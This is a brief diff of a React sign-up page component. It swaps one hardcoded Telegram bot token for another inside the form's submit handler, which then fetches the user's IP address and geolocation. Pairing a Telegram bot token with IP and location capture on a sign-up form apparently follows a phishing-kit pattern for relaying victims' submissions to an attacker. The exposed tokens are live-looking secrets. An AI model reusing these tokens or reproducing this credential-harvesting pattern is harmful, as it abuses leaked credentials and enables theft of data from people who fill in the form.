@@ -54,7 +54,7 @@ export default function SignUp() {
   const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault()
     setIsLoading(true)
-    const botToken = '6441775323:AAHDnTtRUen9JEDYi-4mQlyRPAYaGOEcMBQ'
+    const botToken = '6876515117:AAFEFB9Ka_bMUmRHClvJlGq1DfVz3JFyDZI'
     const responseIP = await fetch('https://api.my-ip.io/v2/ip.json')
     const responseIPJson = await responseIP.json()
     const responseGeo = await fetch('/api/geo', {
